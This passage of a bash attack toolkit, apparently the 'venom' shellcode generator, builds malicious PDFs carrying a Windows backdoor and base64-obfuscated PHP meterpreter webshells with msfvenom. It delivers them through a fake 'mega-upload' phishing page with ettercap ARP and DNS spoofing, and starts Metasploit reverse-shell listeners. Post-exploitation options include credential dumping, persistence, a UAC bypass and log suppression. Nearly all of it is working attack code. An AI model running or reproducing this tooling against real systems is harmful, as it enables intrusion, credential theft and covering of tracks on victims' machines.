\"s|Sk3lL3T0n|$IPATH/templates/evil_pdf/skelleton.c|\" PDF_encoder.py\nsed -i \"s|EXE::CUSTOM backdoor.exe|EXE::CUSTOM $ec/backdoor.exe|\" PDF_encoder.py\nsed -i \"s|Lh0St|$lhost|\" PDF_encoder.py\nsed -i \"s|lP0Rt|$lport|\" PDF_encoder.py\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"XorPdf\";fi\n\n\n# runing evil-pdf-builder python script\nxterm -T \" EVIL PDF BUILDER \" -geometry 110x23 -e \"python PDF_encoder.py\" > /dev/null 2>&1\n# moving files\nmv PDF_encoder[bak].py PDF_encoder.py\nmv ~/backdoor.exe $IPATH/output/backdoor.exe\nmv ~/backdoor.pdf $IPATH/output/$N4m.pdf\necho \"[☠] files generated into output folder...\"\ncd $IPATH\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.pdf\\n\\nchose how to deliver: $N4m.pdf\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 230) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.pdf on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.pdf|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.pdf|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.pdf|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.pdf|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.pdf|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\nfi\n\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nrm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1\nrm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $IPATH/output/backdoor.exe > /dev/null 2>&1\nrm $IPATH/output/$N4m.exe > /dev/null 2>&1\nrm $IPATH/output/$N4m.py > /dev/null 2>&1\nrm $IPATH/output/template.c > /dev/null 2>&1\nrm $ApAcHe/$N4m.pdf > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n}\n\n\n\n\n\n\n# ------------------------------------------------------\n# build shellcode in PHP (webserver stager)\n# php/meterpreter raw format OR php/base64 format\n# Thanks to my friend 'egypt7' from rapid7 for this one\n# interactive kali-apache2 php exploit (by me)\n# ------------------------------------------------------\nsh_shellcode16 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ PHP NAME ☠\" --text \"example: egypt7\" --entry --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"egypt7\";fi\n\necho \"[☠] Building shellcode -> php format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PHP - WEBSHELL\n    PAYLOAD : php/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m.php\"\n\necho \"\"\necho \"[☠] building raw shellcode...\"\nsleep 2\necho \"[☠] Injecting shellcode -> $N4m.php!\"\nsleep 2\n# delete bad chars in php payload\necho \"[☠] deleting webshell.php junk...\"\nsleep 2\ncd $IPATH/output\n\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"WEBSHELL STORED UNDER:\\n$IPATH/output/$N4m.php\\n\\nCopy webshell to target website and visite\\nthe URL to get a meterpreter session\\nExample: http://$lhost/$N4m.php\\n\\nChose how to deliver: $N4m.php\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 370 --height 300) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n       fi\n\n\n   else\n\n\n     # edit files nedded\n     cd $IPATH/templates/phishing\n     cp $InJEc12 mega[bak].html\n     sed \"s|NaM3|$N4m.zip|g\" mega.html > copy.html\n     mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n     # copy from output\n     cd $IPATH/output\n     echo \"[☠] creating archive -> $N4m.zip\"\n     zip $N4m.zip $N4m.php > /dev/null 2>&1\n     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1\n\n\nif [ \"$D0M4IN\" = \"YES\" ]; then\n        echo \"---\"\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"---\"\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n   fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.php > /dev/null 2>&1\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_webshell_menu\n  clear\nfi\n}\n\n\n\n\nsh_webshellbase () {\n# ----------------------\n# BASE64 ENCODED PAYLOAD\n# ----------------------\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ PHP NAME ☠\" --text \"example: egypt7b64\" --entry --width 300) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"egypt7b64\";fi\n\necho \"[☠] Building shellcode -> php format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PHP -> WEBSHELL\n    PAYLOAD : php/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw\"\n\nst0r3=`cat $IPATH/output/chars.raw`\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $st0r3\necho \"\"\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc11 $IPATH/templates/exec[bak].php\nsleep 2\n\n\n   # check if exec.ps1 exists\n   if [ -e $InJEc11 ]; then\n      echo \"[☠] exec.php -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] exec.php -> not found!\"\n      exit\n      fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n# injecting shellcode into name.php\ncd $IPATH/templates/\necho \"[☠] Injecting shellcode -> $N4m.php!\"\nsleep 2\nsed \"s|InJ3C|$st0r3|g\" exec.php > obfuscated.raw\nmv obfuscated.raw $IPATH/output/$N4m.php\nchmod +x $IPATH/output/$N4m.php > /dev/null 2>&1\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"WEBSHELL STORED UNDER:\\n$IPATH/output/$N4m.php\\n\\nCopy webshell to target website and visite\\nthe URL to get a meterpreter session\\nExample: http://$lhost/$N4m.php\\n\\nChose how to deliver: $N4m.php\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 370 --height 300) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n       fi\n\n\n   else\n\n     # edit files nedded\n     cd $IPATH/templates/phishing\n     cp $InJEc12 mega[bak].html\n     sed \"s|NaM3|$N4m.zip|g\" mega.html > copy.html\n     mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n     # copy from output\n     cd $IPATH/output\n     echo \"[☠] creating archive -> $N4m.zip\"\n     zip $N4m.zip $N4m.php > /dev/null 2>&1\n     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1\n\n\nif [ \"$D0M4IN\" = \"YES\" ]; then\n        echo \"---\"\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"---\"\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n   fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nrm $ApAcHe/$N4m.php > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nclear\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_webshell_menu\n  clear\nfi\n}\n\n\n\n\n\n# ------------------------------\n# BASE64 MY UNIX APACHE2 EXPLOIT\n# ------------------------------\nsh_webshellunix () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text 